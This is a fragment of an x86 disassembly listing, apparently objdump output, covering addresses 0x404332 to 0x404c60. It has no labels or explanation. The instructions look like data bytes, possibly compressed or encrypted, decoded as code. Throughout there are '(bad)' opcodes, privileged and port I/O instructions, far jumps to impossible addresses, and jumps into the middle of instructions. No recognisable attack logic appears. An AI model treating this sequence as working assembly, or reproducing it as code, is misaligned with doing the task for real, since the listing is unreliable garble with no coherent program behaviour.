  404332:	xchg   ebx,eax
  404333:	mov    DWORD PTR [ecx-0xa],eax
  404336:	pop    edx
  404337:	jmp    0x8b8d396d
  40433c:	pop    ebp
  40433d:	adc    dh,BYTE PTR [edx+0x61e9c75f]
  404343:	dec    ebx
  404344:	int    0xc4
  404346:	and    cl,BYTE PTR [edx+ebp*8]
  404349:	int    0xe8
  40434b:	mov    edi,0xbd80bcda
  404350:	mov    edx,0xde99d6bd
  404355:	ins    DWORD PTR es:[edi],dx
  404356:	and    al,0x74
  404358:	add    BYTE PTR [eax],al
  40435a:	pop    ebp
  40435b:	sbb    eax,ecx
  40435d:	sub    dh,BYTE PTR [eax+ecx*1-0x27]
  404361:	jb     0x40432b
  404363:	clc    
  404364:	cli    
  404365:	or     bh,BYTE PTR [ebp-0x149b0708]
  40436b:	add    al,0x5d
  40436d:	stc    
  40436e:	repz rol BYTE PTR [ebx],cl
  404371:	das    
	...
  40437e:	add    BYTE PTR [eax],al
  404380:	add    BYTE PTR [ebx-0x3a],cl
  404383:	shl    ah,0x67
  404386:	enter  0xb28b,0xce
  40438a:	mov    ah,0x23
  40438c:	mov    al,0xd6
  40438e:	mov    edi,0x586a7d8d
  404393:	adc    al,0x25
  404395:	or     BYTE PTR gs:[esi-0x3f],dl
  404399:	mov    eax,ds:0x90ea09c7
  40439e:	nop
  40439f:	clc    
  4043a0:	mov    edx,0xbafae8e6
  4043a5:	fmul   DWORD PTR [edx-0x5c1e1974]
  4043ab:	mov    eax,ds:0x3c4b6691
  4043b0:	sub    BYTE PTR [eax-0x11ccfcf5],ah
  4043b6:	mov    edi,0xb47e5033
  4043bb:	xor    edx,DWORD PTR [ebx-0x24]
  4043be:	cdq    
  4043bf:	pop    ds
  4043c0:	xor    DWORD PTR [esi-0x3d151828],esp
  4043c6:	adc    eax,0x87b2ac1
  4043cb:	fldenv [edx+0x8]
  4043ce:	clc    
  4043cf:	cli    
  4043d0:	retf   0xf806
  4043d3:	clc    
  4043d4:	ins    BYTE PTR es:[edi],dx
  4043d5:	jmp    0x4043da
  4043d7:	out    0x24,al
  4043d9:	add    dh,ah
  4043db:	add    ah,BYTE PTR [edi+0xc0c544]
  4043e1:	aaa    
  4043e2:	add    ebx,eax
  4043e4:	mov    eax,DWORD PTR [eax]
	...
  4043f2:	add    BYTE PTR [eax],al
  4043f4:	popa   
  4043f5:	mov    dl,0xf7
  4043f7:	and    edx,DWORD PTR [ebx]
  4043f9:	mov    cl,0xfa
  4043fb:	lea    esi,[esi+0x6507d61e]
  404401:	ret    0x5603
  404404:	inc    edx
  404405:	enter  0x9c2,0x9
  404409:	fmul   DWORD PTR [ebx+0x237b49f8]
  40440f:	sti    
  404410:	jmp    0xcdccd194
  404415:	mov    WORD PTR ds:0x4e0116d5,cs
  40441b:	or     al,0xfb
  40441d:	(bad)  
  40441e:	push   cs
  40441f:	add    edx,DWORD PTR [eax]
  404421:	mov    edx,edi
  404423:	xor    eax,DWORD PTR [ebx]
  404425:	mov    eax,ds:0x8ad033f7
  40442a:	pushf  
  40442b:	pop    ds
  40442c:	das    
  40442d:	adc    al,0x5a
  40442f:	inc    ebp
  404430:	mov    ecx,0xc9c12025
  404435:	adc    eax,DWORD PTR [ebx]
  404437:	fld    DWORD PTR [ecx]
  404439:	jg     0x40446e
  40443b:	sti    
  40443c:	cdq    
  40443d:	jns    0x404472
  40443f:	stc    
  404440:	je     0x6153494d
  404446:	test   eax,0xc0b3c403
  40444b:	rol    BYTE PTR [edi+0x218bc300],0xb1
  404452:	mul    DWORD PTR [ebx]
  404454:	mov    ds:0x8dfab1,eax
	...
  404465:	add    BYTE PTR [eax],al
  404467:	mov    dh,0x1d
  404469:	clc    
  40446a:	mov    ds:0x56037a8d,eax
  40446f:	push   edx
  404470:	enter  0x9c2,0x49
  404474:	xlat   BYTE PTR ds:[ebx]
  404475:	mov    edi,eax
  404477:	arpl   di,bx
  404479:	mov    ebp,0xbbe02823
  40447e:	(bad)  
  40447f:	xlat   BYTE PTR ds:[ebx]
  404480:	mov    bl,0xda
  404482:	add    cl,BYTE PTR [ebx+eax*4-0x1288b1fc]
  404489:	ror    DWORD PTR [esi],0x60
  40448c:	out    0x8b,al
  40448e:	cli    
  40448f:	push   eax
  404490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404491:	jecxz  0x40448a
  404493:	xor    BYTE PTR [esi+0x26549c91],ah
  404499:	push   eax
  40449a:	sub    bl,dh
  40449c:	scas   eax,DWORD PTR es:[edi]
  40449d:	pop    ebp
  40449e:	xor    BYTE PTR [edx],ah
  4044a0:	jo     0x4044ba
  4044a2:	add    edi,DWORD PTR [edx-0x26cc42c9]
  4044a8:	mov    edi,0xa3e78dba
  4044ad:	inc    ecx
  4044ae:	cmp    ecx,ecx
  4044b0:	arpl   WORD PTR [ebx],ax
  4044b2:	inc    esi
  4044b3:	push   edi
  4044b4:	ins    DWORD PTR es:[edi],dx
  4044b5:	les    eax,FWORD PTR [eax+eiz*2]
  4044b8:	outs   dx,DWORD PTR ds:[esi]
  4044b9:	mov    edi,ebx
  4044bb:	jo     0x404452
  4044bd:	repz not esi
  4044c0:	pop    eax
  4044c1:	pop    ss
  4044c2:	adc    DWORD PTR [ebp+0x2d0386bd],0xc2c4cc
	...
  4044d8:	add    BYTE PTR [eax],al
  4044da:	pop    eax
  4044db:	scas   eax,DWORD PTR es:[edi]
  4044dc:	ror    DWORD PTR [ebx+0x33bb1f8b],cl
  4044e2:	jns    0x40450d
  4044e4:	nop
  4044e5:	cmovno ecx,ebp
  4044e8:	mov    al,ds:0xef9a606d
  4044ed:	shl    BYTE PTR [edx-0x1735fd24],0x45
  4044f4:	repz not DWORD PTR [eax+0x6c9c90f5]
  4044fb:	fdivr  st,st(3)
  4044fd:	in     al,0x46
  4044ff:	add    eax,0xc47b5dea
  404504:	sub    dl,BYTE PTR [edi]
  404506:	pusha  
  404507:	fsub   QWORD PTR [edx-0x43]
  40450a:	jo     0x4044cb
  40450c:	fidivr DWORD PTR [edx+0x47ee80d6]
  404512:	or     DWORD PTR [ebx+0x45],edi
  404515:	add    ebx,DWORD PTR [ebp+0x67c42801]
  40451b:	push   es
  40451c:	sub    cl,BYTE PTR [ebx-0xd2009f8]
  404522:	hlt    
  404523:	xchg   DWORD PTR [ebp+0x16],esi
  404526:	retf   0xb7c9
  404529:	dec    edx
  40452a:	pusha  
  40452b:	push   ebx
  40452c:	stc    
  40452d:	les    esp,FWORD PTR [ecx]
  40452f:	push   cs
  404530:	jmp    0x90ba:0xfabce8d3
  404537:	mov    edi,0x255c8f64
  40453c:	and    bh,BYTE PTR [ebx+0x0]
	...
  40454b:	add    BYTE PTR [eax],al
  40454d:	int    0x5
  40454f:	aaa    
  404550:	and    BYTE PTR [edx-0x56fd063d],ah
  404556:	lea    edx,[ebx-0x700a4b0e]
  40455c:	nop
  40455d:	(bad)  
  40455e:	sbb    ecx,edi
  404560:	jg     0x40453e
  404562:	jp     0x40454e
  404564:	pop    ebp
  404565:	dec    ebx
  404566:	les    ebp,FWORD PTR [edx+0x62dc6016]
  40456c:	mov    esp,0xbb1abf50
  404571:	out    dx,al
  404572:	and    dh,0xc5
  404575:	cmc    
  404576:	popf   
  404577:	add    DWORD PTR [ebx],eax
  404579:	and    eax,0x5fc327f1
  40457e:	push   es
  40457f:	sub    cl,BYTE PTR [edx-0xdc00aa8]
  404585:	dec    esp
  404586:	mov    eax,DWORD PTR [eax]
  404588:	pop    ebp
  404589:	jne    0x404546
  40458b:	daa    
  40458c:	mov    dl,bh
  40458e:	add    al,0x16
  404590:	sub    BYTE PTR [edx],ah
  404592:	or     eax,0xbde93903
  404597:	xor    edx,DWORD PTR [edx]
  404599:	xor    DWORD PTR [edi-0x7daaa273],edi
  40459f:	xor    BYTE PTR [esi],dl
  4045a1:	xor    al,0x5
  4045a3:	dec    esi
  4045a4:	in     eax,dx
  4045a5:	pop    ds
  4045a6:	(bad)  
  4045a7:	adc    dl,ch
  4045a9:	sbb    cl,BYTE PTR [ebp-0xb374506]
  4045af:	clc    
  4045b0:	je     0x4045b2
	...
  4045be:	add    BYTE PTR [eax],al
  4045c0:	ret    
  4045c1:	sbb    BYTE PTR ds:0x301e8fc,al
  4045c7:	aaa    
  4045c8:	dec    edi
  4045c9:	mov    bl,0xf6
  4045cc:	arpl   si,bx
  4045ce:	mov    eax,eax
  4045d0:	sar    BYTE PTR [esi-0x7e1b3dcd],cl
  4045d6:	pop    es
  4045d7:	lock mov al,0xd1
  4045da:	fldl2e 
  4045dc:	push   ds
  4045dd:	loope  0x40459f
  4045df:	test   eax,0x72c3046b
  4045e4:	cli    
  4045e5:	hlt    
  4045e6:	clc    
  4045e7:	(bad)  
  4045e9:	mov    dl,BYTE PTR [esi+esi*8-0x70246103]
  4045f0:	bound  ecx,QWORD PTR [edi+0x30]
  4045f3:	test   al,0xa1
  4045f5:	or     al,0x3
  4045f7:	cdq    
  4045f8:	fidivr DWORD PTR [ebp-0x416d8dcd]
  4045fe:	lea    esi,[ebp+0x6e]
  404601:	mov    ebp,0x4568b7c
  404606:	dec    esi
  404607:	adc    eax,0xea10c6a0
  40460c:	call   0x337c:0x5900fa8c
  404613:	stc    
  404614:	(bad)  
  404615:	gs pop ds
  404617:	gs in  al,dx
  404619:	daa    
  40461a:	les    eax,FWORD PTR [ebx]
  40461c:	aam    0xb
  40461e:	rol    ebx,0x3d
  404621:	add    eax,0xbfd9
	...
  404632:	add    BYTE PTR [ebp+0x7a],dl
  404635:	(bad)  
  404636:	dec    DWORD PTR [ecx]
  404638:	jle    0x404645
  40463a:	sti    
  40463b:	or     DWORD PTR [ebx-0x73],edi
  40463e:	test   BYTE PTR ds:0xe292240,cl
  404644:	add    eax,0xff3ac106
  404649:	add    al,bl
  40464b:	xor    eax,0x5ffff7a
  404650:	mov    ch,0xf8
  404652:	or     eax,DWORD PTR [edx]
  404654:	mov    ch,0xfa
  404656:	lea    ebp,[esi+0x11]
  404659:	xchg   edi,eax
  40465a:	jmp    DWORD PTR [eax+0x46]
  40465d:	add    edx,DWORD PTR [esi-0x3a]
  404660:	ret    0xac2
  404663:	leave  
  404664:	sar    DWORD PTR [edi-0x86ea01],cl
  40466a:	xor    edx,DWORD PTR [ecx]
  40466c:	or     eax,0x870233fa
  404671:	mov    WORD PTR [edi],cs
  404673:	sbb    eax,0xb9ab93a5
  404678:	dec    ecx
  404679:	cmp    cl,al
  40467b:	sti    
  40467c:	or     BYTE PTR [ebx],al
  40467e:	retf   0x7925
  404681:	(bad)  
  404682:	call   DWORD PTR ds:0x130bf7b5
  404688:	mov    ch,0xf9
  40468a:	lea    edx,[esi]
  40468c:	sbb    DWORD PTR [ecx],edi
  40468e:	mov    al,ds:0x5e0377f9
  404693:	outs   dx,BYTE PTR ds:[esi]
  404694:	ret    0x15c3
	...
  4046a3:	add    BYTE PTR [eax],al
  4046a5:	add    BYTE PTR [ebx-0x55],ah
  4046a8:	fidivr DWORD PTR [edi-0x43b99c]
  4046ae:	nop
  4046af:	inc    edx
  4046b0:	or     bl,bh
  4046b2:	nop
  4046b3:	inc    ebp
  4046b4:	mov    es,WORD PTR [esp+eiz*2-0x41a4a615]
  4046bb:	stos   DWORD PTR es:[edi],eax
  4046bc:	inc    ebp
  4046bd:	xor    BYTE PTR [edx],ah
  4046bf:	in     eax,dx
  4046c0:	add    al,0x3
  4046c2:	and    BYTE PTR [eax-0x44],bl
  4046c5:	jmp    FWORD PTR [eax+edx*1]
  4046c8:	lock clc 
  4046ca:	pop    eax
  4046cb:	adc    al,0xf0
  4046cd:	cli    
  4046ce:	out    dx,al
  4046cf:	pop    eax
  4046d0:	adc    al,0x92
  4046d2:	daa    
  4046d3:	test   eax,0xa0b5038c
  4046d8:	ret    0x59c2
  4046db:	stos   DWORD PTR es:[edi],eax
  4046dc:	sar    DWORD PTR [edi-0x446004],cl
  4046e2:	xor    BYTE PTR [ebx-0x2bcf05f1],ah
  4046e8:	mov    DWORD PTR [esp+edx*2-0x23104fb7],ecx
  4046ef:	stos   DWORD PTR es:[edi],eax
  4046f0:	dec    ecx
  4046f1:	sub    BYTE PTR [edx-0x66fcf493],ah
  4046f7:	das    
  4046f8:	mov    ebx,0xf767c4ff
  4046fd:	imul   DWORD PTR [eax+0x65]
  404700:	idiv   ecx
  404702:	out    0x38,al
  404704:	sbb    edx,ecx
  404706:	push   cs
  404707:	sub    BYTE PTR [ecx+0x3],al
	...
  404719:	add    eax,0x76c3c4a0
  40471e:	stos   DWORD PTR es:[edi],eax
  40471f:	fdivr  QWORD PTR [edi-0x44c86c]
  404725:	push   eax
  404726:	xor    cl,BYTE PTR [edi]
  404728:	sti    
  404729:	push   eax
  40472a:	xor    eax,0x5648489
  40472f:	mov    dh,0x39
  404731:	retf   
  404732:	es jmp 0x6002:0x29c44341
  40473a:	ret    0xbb8e
  40473d:	pop    esp
  40473e:	mov    dh,0x46
  404740:	neg    DWORD PTR [ebx+0xa]
  404743:	inc    ecx
  404744:	test   DWORD PTR [ecx-0x78],0x9f43135d
  40474b:	std    
  40474c:	mov    ecx,0xc4e54f60
  404751:	and    DWORD PTR [ebx],ecx
  404753:	jmp    0x24bb:0x16b5ecd3
  40475a:	repnz adc DWORD PTR [edi],ecx
  40475d:	sbb    edx,esi
  40475f:	add    BYTE PTR [ecx+0x46d505e7],cl
  404765:	bound  esp,QWORD PTR [edx-0x16]
  404768:	dec    ecx
  404769:	imul   eax,esp,0x28
  40476c:	or     esp,DWORD PTR [eax-0x35]
  40476f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404770:	mov    edx,0xf6deb5f4
  404775:	hlt    
  404776:	or     eax,edx
  404778:	imul   dl
  40477a:	xchg   DWORD PTR [ebp+0x1a],ebp
	...
  404789:	add    BYTE PTR [eax],al
  40478b:	add    BYTE PTR [edx],al
  40478d:	adc    al,0xf1
  40478f:	dec    ecx
  404790:	pusha  
  404791:	push   edi
  404792:	cmc    
  404793:	les    esp,FWORD PTR [eax+0x4dcea0f]
  404799:	mov    dh,0xae
  40479b:	mov    edx,0xea2f1bc
  4047a0:	mov    eax,0xe7889ff1
  4047a5:	std    
  4047a6:	push   0x39
  4047a8:	adc    BYTE PTR [esi-0x3b8cbe16],ch
  4047ae:	test   eax,0x3ec26001
  4047b3:	mov    edx,0x7600b58c
  4047b8:	lea    edi,[ebx+ecx*1-0x72458a8f]
  4047bf:	jge    0x404812
  4047c1:	lock icebp 
  4047c3:	and    ebp,edx
  4047c5:	add    DWORD PTR [esi+0x5],edx
  4047c8:	sahf   
  4047c9:	ret    0xea0a
  4047cc:	xor    BYTE PTR [ebp-0x1],dh
  4047cf:	inc    esi
  4047d0:	sbb    DWORD PTR [ebp-0x50a2bdcd],esi
  4047d6:	xor    esi,DWORD PTR [ecx]
  4047d8:	fild   DWORD PTR [ecx-0x22e98df1]
  4047de:	sub    ch,dl
  4047e0:	stos   BYTE PTR es:[edi],al
  4047e1:	std    
  4047e2:	shr    BYTE PTR [eax],0x59
  4047e5:	or     dl,cl
  4047e7:	push   esi
  4047e8:	jmp    0x154f47a1
  4047ed:	mov    ebp,0xb
	...
  4047fe:	add    BYTE PTR ds:0x695d8daf,cl
  404804:	xchg   esi,eax
  404805:	shr    DWORD PTR [edi-0x4b],cl
  404808:	or     BYTE PTR [esi-0x3b],bl
  40480b:	daa    
  40480c:	leave  
  40480d:	adc    eax,0x7d8119ea
  404812:	icebp  
  404813:	popa   
  404814:	or     al,0x1
  404816:	arpl   WORD PTR ss:[esi],ax
  404819:	dec    edi
  40481a:	loope  0x40487d
  40481c:	pop    esp
  40481d:	or     al,0xc6
  40481f:	sbb    al,0xb1
  404821:	lea    esi,[edi]
  404823:	daa    
  404824:	add    al,0x89
  404826:	out    0x6,al
  404828:	mov    ch,0xff
  40482a:	adc    ebx,DWORD PTR [eax]
  40482c:	push   eax
  40482d:	pop    eax
  40482e:	inc    esi
  40482f:	sbb    DWORD PTR [esi+0x5a60edc2],edi
  404835:	mov    eax,DWORD PTR [ebp+0x36f8c9de]
  40483b:	xor    DWORD PTR [eax-0x39],ebx
  40483e:	add    BYTE PTR [edi+0x6d],al
  404841:	add    BYTE PTR [eax],al
  404843:	jp     0x40484d
  404845:	push   DWORD PTR [ebp+0x7e]
  404848:	jge    0x40488f
  40484a:	clc    
  40484b:	lds    esi,FWORD PTR [edi+ecx*2+0x108cb65]
  404852:	and    eax,edi
  404854:	in     eax,0xc6
  404856:	add    eax,0x4113a6
  40485b:	ret    
  40485c:	and    cl,ch
  40485e:	out    dx,eax
  40485f:	test   DWORD PTR [edi+edx*2+0x65],esi
	...
  404872:	sti    
  404873:	pop    es
  404874:	(bad)  
  404875:	(bad)  
  404877:	xchg   ecx,eax
  404878:	mov    DWORD PTR ds:0x4112ee,0x103243d4
  404882:	test   DWORD PTR [edi+ebx*2-0xff8049b],esi
  404889:	loope  0x4048e3
  40488b:	retf   0x1ceb
  40488e:	xchg   ecx,eax
  40488f:	hlt    
  404890:	pop    es
  404891:	add    eax,edi
  404893:	jnp    0x4048ff
  404895:	inc    eax
  404896:	loop   0x4048ab
  404898:	gs inc ecx
  40489a:	or     bl,BYTE PTR [eax-0x18]
  40489d:	arpl   WORD PTR [ebx],dx
  40489f:	ins    DWORD PTR es:[edi],dx
  4048a0:	inc    DWORD PTR [ebx-0x17bf92b9]
  4048a6:	mov    esi,0x49000007
  4048ab:	jmp    0x4048a4
  4048ad:	inc    eax
  4048ae:	cdq    
  4048af:	iret   
  4048b0:	mov    ebx,DWORD PTR [ebp-0x5e]
  4048b3:	mov    bl,al
  4048b5:	inc    eax
  4048b6:	inc    ecx
  4048b7:	repz pop es
  4048b9:	add    eax,DWORD PTR [edi+0x6668536d]
  4048bf:	adc    al,0x41
  4048c1:	add    BYTE PTR [edx+0x61],ch
  4048c4:	cmp    al,0xe9
  4048c6:	arpl   WORD PTR [ebx-0x7dc1fe48],bx
  4048cc:	rol    DWORD PTR [ebx+0x4300ff],0xe3
  4048d3:	push   ds
  4048d4:	lods   al,BYTE PTR ds:[esi]
  4048d5:	aaa    
	...
  4048e2:	add    BYTE PTR [eax],al
  4048e4:	add    BYTE PTR ds:0x6beb84d7,cl
  4048ea:	mov    edx,0x81c0800d
  4048ef:	push   ds
  4048f0:	inc    ecx
  4048f1:	arpl   WORD PTR [esi+0x456d7844],bx
  4048f7:	mov    WORD PTR [eax],es
  4048f9:	arpl   WORD PTR [esp+edi*2-0x47b3ab38],bx
  404900:	jmp    0x404963
  404902:	js     0x404911
  404904:	add    BYTE PTR [eax],0x59
  404907:	push   ds
  404908:	inc    ecx
  404909:	arpl   WORD PTR [esp+eax*2+0x3e382d78],bx
  404910:	or     al,0xea
  404912:	mov    ah,0x3
  404914:	add    BYTE PTR [ebx-0x31],ah
  404917:	aad    0xf7
  404919:	add    dl,ah
  40491b:	retf   
  40491c:	movaps XMMWORD PTR [eax+0x63],xmm0
  404920:	mov    gs:0xe7158a9c,al
  404926:	add    DWORD PTR [edx+0x0],0x3950b
  40492d:	arpl   WORD PTR [ebp+0x54],di
  404930:	mov    gs:0x8f158a9c,al
  404936:	inc    ecx
  404937:	inc    ebp
  404938:	add    al,ch
  40493a:	rcr    DWORD PTR [ebx+0x65],1
  40493d:	and    bl,BYTE PTR [esi+eax*1+0x7765cc8]
  404944:	leave  
  404945:	add    BYTE PTR ds:0x4121,cl
	...
  404957:	add    BYTE PTR [ebx+0x25],ah
  40495a:	adc    DWORD PTR [esi+edi*1+0x5],edx
  40495e:	sub    BYTE PTR [edx+ebx*8],al
  404961:	add    BYTE PTR [ecx+0x21],al
  404964:	and    al,BYTE PTR ds:0x44065848
  40496a:	jmp    0xc65b7f9
  40496f:	inc    ebp
  404970:	arpl   WORD PTR [edx],ax
  404972:	mov    cl,0x7
  404974:	cdq    
  404975:	adc    ax,0x2221
  404979:	add    eax,0x28031160
  40497e:	test   al,0x3
  404980:	stc    
  404981:	sbb    BYTE PTR [esi+0x31],bl
  404984:	push   ebx
  404985:	sbb    eax,0x5a220b9
  40498a:	inc    ecx
  40498b:	xchg   ecx,eax
  40498c:	dec    ebx
  40498d:	mov    dl,0x46
  40498f:	pop    ebx
  404990:	lods   eax,DWORD PTR ds:[esi]
  404991:	push   edx
  404992:	xor    dl,al
  404994:	push   edi
  404995:	add    eax,0x864f8a9c
  40499a:	and    eax,0x26acfabc
  40499f:	mov    bh,0x2c
  4049a1:	jle    0x404988
  4049a3:	enter  0x27ff,0xa8
  4049a7:	add    ebp,eax
  4049a9:	sbb    BYTE PTR [esp+ebp*2],bl
  4049ac:	jle    0x4049f2
  4049ae:	jmp    0x334264b9
  4049b3:	lea    ebx,[edi-0x40]
  4049b6:	dec    ebp
  4049b7:	and    DWORD PTR [edx+0x106005],esp
	...
  4049c9:	add    BYTE PTR [eax],al
  4049cb:	es pop ebp
  4049cd:	dec    esp
  4049ce:	inc    ebp
  4049cf:	arpl   WORD PTR [esp+edx*2-0x27],ax
  4049d3:	stos   BYTE PTR es:[edi],al
  4049d4:	(bad)  
  4049d5:	(bad)  
  4049d6:	mov    dh,0xdc
  4049d8:	jge    0x4049bf
  4049da:	mov    bl,bh
  4049dc:	sub    ch,BYTE PTR [eax]
  4049de:	add    al,0xd8
  4049e0:	sbb    BYTE PTR [edi+edi*2+0x3d],ch
  4049e4:	inc    esp
  4049e5:	add    cl,ch
  4049e7:	mov    cl,0x5
  4049e9:	lea    edi,ds:0xda004455
  4049ef:	pop    esp
  4049f0:	and    BYTE PTR [edi+eax*1+0x1e],0x5
  4049f5:	xor    ebp,DWORD PTR [ebx-0x1a763b49]
  4049fb:	jmp    0x404a65
  4049fd:	data16 sub BYTE PTR [edi+0x44],ah
  404a01:	jne    0x40499a
  404a03:	(bad)  [edi]
  404a05:	push   eax
  404a06:	or     al,0x26
  404a08:	add    eax,0x2824b48b
  404a0d:	inc    ecx
  404a0e:	jmp    0xc49839ec
  404a13:	pop    ds
  404a14:	add    eax,0x2abb1cff
  404a19:	inc    ecx
  404a1a:	jmp    0x473c94fc
  404a1f:	push   ebx
  404a20:	push   ecx
  404a21:	gs test al,0x60
  404a24:	add    BYTE PTR [ebp+0x31],0xbf
  404a28:	mov    eax,ds:0x7ced2eff
  404a2d:	(bad)  
  404a2e:	jb     0x404a30
	...
  404a3c:	add    BYTE PTR [eax],al
  404a3e:	in     eax,dx
  404a3f:	mov    eax,0xe4e6cad2
  404a44:	push   esp
  404a45:	adc    eax,0xe503c369
  404a4a:	jmp    0x404ac5
  404a4c:	gs test al,0x60
  404a4f:	add    al,0x45
  404a51:	add    DWORD PTR [ebx-0x72],esp
  404a54:	jns    0x404ac1
  404a56:	call   0xf84a:0xdeed75b0
  404a5d:	jo     0x404a93
  404a5f:	mov    cl,0xc1
  404a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a62:	dec    ebp
  404a63:	jl     0x404a63
  404a65:	bound  edx,QWORD PTR [edx]
  404a67:	mov    ebx,0x41cd63e4
  404a6d:	add    BYTE PTR [edi+0x5ecb9bd],cl
  404a73:	jnp    0x404a74
  404a75:	mov    ecx,DWORD PTR [edi+edi*2]
  404a78:	xlat   BYTE PTR ds:[ebx]
  404a79:	xor    edi,DWORD PTR [edi+0x6d]
  404a7c:	xor    eax,edx
  404a7e:	mov    ecx,0x5c048cb0
  404a83:	inc    esp
  404a84:	add    BYTE PTR [ebx],al
  404a86:	dec    edi
  404a87:	jno    0x404a8e
  404a89:	mov    eax,ds:0xff6ecce1
  404a8e:	(bad)  
  404a8f:	js     0x404a20
  404a91:	inc    ebp
  404a92:	loop   0x404b10
  404a94:	jge    0x404a92
  404a96:	retf   
  404a97:	outs   dx,DWORD PTR ds:[esi]
  404a98:	push   ds
  404a99:	mov    eax,DWORD PTR [esi+edi*2]
  404a9c:	repz sar DWORD PTR [ecx],0xb0
  404aa0:	add    bl,al
	...
  404aae:	add    BYTE PTR [eax],al
  404ab0:	add    BYTE PTR [ebx-0x59463021],bh
  404ab6:	jp     0x404ab7
  404ab8:	inc    ecx
  404aba:	jb     0x404a47
  404abc:	push   ebp
  404abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404abe:	inc    BYTE PTR [esp+edi*8+0x59]
  404ac2:	ret    0xc623
  404ac5:	inc    ecx
  404ac6:	mov    BYTE PTR [ebx],0x4
  404ac9:	xchg   edi,eax
  404aca:	push   ebp
  404acb:	inc    cx
  404acd:	cmp    al,BYTE PTR ds:0xd83ff845
  404ad3:	mov    esp,0x757a851b
  404ad8:	cld    
  404ad9:	mov    ch,0xf0
  404adb:	test   DWORD PTR [ecx-0x393e8819],0x8bfe7d24
  404ae5:	stc    
  404ae6:	ret    0x5c3
  404ae9:	or     esp,ecx
  404aeb:	inc    ecx
  404aec:	jne    0x404a9f
  404aee:	sub    ch,ah
  404af0:	inc    DWORD PTR ds:0x63c68b79
  404af6:	and    ecx,esp
  404af8:	xor    ebx,DWORD PTR [esi]
  404afa:	ret    0xc1f0
  404afd:	pusha  
  404afe:	mov    ds:0xdd3da486,al
  404b03:	add    eax,DWORD PTR [ebx]
  404b05:	es jbe 0x404b06
  404b08:	aad    0xa2
  404b0a:	cmp    ecx,edx
  404b0c:	push   DWORD PTR [esi]
  404b0e:	push   0xffffff84
  404b10:	inc    ebp
  404b11:	stos   DWORD PTR es:[edi],eax
  404b12:	xor    al,0x36
  404b14:	cld    
	...
  404b21:	add    BYTE PTR [eax],al
  404b23:	add    BYTE PTR [edx-0x6a74eaa1],ah
  404b29:	and    dh,BYTE PTR [eax+0xa0a0c1]
  404b2f:	fsub   DWORD PTR [edx]
  404b31:	mov    ecx,0xe5e01d3
  404b36:	pop    ds
  404b37:	inc    ecx
  404b38:	arpl   WORD PTR [ebp+0x5d0653ee],bx
  404b3e:	add    eax,DWORD PTR [ecx]
  404b40:	es (bad) 
  404b42:	push   ds
  404b43:	inc    ecx
  404b44:	arpl   WORD PTR [ebx],sp
  404b46:	ds cld 
  404b48:	bound  ebp,QWORD PTR [ecx-0x635d9aa9]
  404b4e:	mov    BYTE PTR [ebp+0x4b],al
  404b51:	sahf   
  404b52:	(bad)  
  404b53:	pop    edi
  404b54:	(bad)  
  404b55:	pop    ebp
  404b56:	add    ecx,ecx
  404b58:	and    BYTE PTR [edx-0x6dd31378],bl
  404b5e:	or     ebp,eax
  404b60:	mov    dl,0x25
  404b62:	add    eax,DWORD PTR [eax]
  404b64:	loopne 0x404b7a
  404b66:	mov    ah,0x75
  404b68:	cmp    eax,0xfb082dff
  404b6d:	xchg   edx,eax
  404b6e:	jp     0x404b70
  404b70:	arpl   WORD PTR [ebx-0xb9b8a3d],si
  404b76:	mov    bl,0xff
  404b78:	hlt    
  404b79:	lahf   
  404b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b7b:	adc    ebx,eax
  404b7d:	add    eax,0xfad30029
  404b82:	test   al,0x39
  404b84:	fs ins DWORD PTR es:[edi],dx
  404b86:	(bad)  
  404b87:	mov    bl,0x0
	...
  404b95:	add    BYTE PTR [eax],al
  404b97:	aam    0xae
  404b99:	ret    0xd808
  404b9c:	add    eax,0xc39a0472
  404ba1:	in     eax,0x3
  404ba3:	push   ss
  404ba4:	jp     0x404b6b
  404ba6:	xchg   DWORD PTR [edi-0x7608e54b],ebx
  404bac:	sbb    ebp,edi
  404bae:	sbb    eax,0x9beb1b62
  404bb3:	pop    ecx
  404bb4:	ins    BYTE PTR es:[edi],dx
  404bb5:	jmp    0x8eee2bbd
  404bba:	cmp    DWORD PTR [ecx-0x66],esp
  404bbd:	or     edi,DWORD PTR [edi-0x55]
  404bc0:	sbb    ebx,ecx
  404bc2:	and    BYTE PTR [esi],0xb5
  404bc5:	sbb    DWORD PTR [ebx+ebp*8+0x5b36ea7],ebx
  404bcc:	(bad)  
  404bcd:	lods   al,BYTE PTR ds:[esi]
  404bce:	mov    bl,0x61
  404bd0:	add    eax,0x87734172
  404bd5:	and    al,0x2a
  404bd7:	jmp    0xe901:0xce875b3f
  404bde:	aaa    
  404bdf:	pop    esi
  404be0:	jp     0x404b86
  404be2:	dec    DWORD PTR [ecx+0xe]
  404be5:	push   0x31
  404be7:	addr16 add eax,0x2fe1fdb4
  404bed:	icebp  
  404bee:	add    ebp,DWORD PTR [esi+0x9e91209]
  404bf4:	(bad)  
  404bf5:	adc    eax,0x7d9d6b39
  404bfa:	mov    dl,0x0
	...
  404c08:	add    BYTE PTR [eax],al
  404c0a:	or     al,0xae
  404c0c:	push   0xffffffac
  404c0e:	add    al,0x38
  404c10:	jmp    0x404bb0
  404c12:	push   edi
  404c13:	jl     0x404c15
  404c15:	lods   al,BYTE PTR ds:[esi]
  404c16:	lods   al,BYTE PTR ds:[esi]
  404c17:	sbb    dl,BYTE PTR [eax]
  404c19:	pop    esp
  404c1a:	call   0xb8a8:0xc73a50b5
  404c21:	jmp    0xd738ce86
  404c26:	fwait
  404c27:	std    
  404c28:	push   edx
  404c29:	shl    DWORD PTR [ecx-0x3216ff94],0xca
  404c30:	mov    ebp,DWORD PTR [edx-0x1a3d43d3]
  404c36:	pusha  
  404c37:	pop    eax
  404c38:	mov    edi,DWORD PTR [ebp+0x24835615]
  404c3e:	dec    edi
  404c3f:	add    eax,0x408f275
  404c44:	add    cl,ch
  404c46:	pusha  
  404c47:	dec    esi
  404c48:	pop    ebx
  404c49:	mov    al,ds:0x720000a6
  404c4e:	push   ebx
  404c4f:	add    DWORD PTR [ebx+0x560e9],edi
  404c55:	add    ebx,DWORD PTR [edi-0x52]
  404c58:	jne    0x404c33
  404c5a:	or     DWORD PTR [esi+0x74c8f175],ebp
  404c60:	mov    eax,0xc08260e9
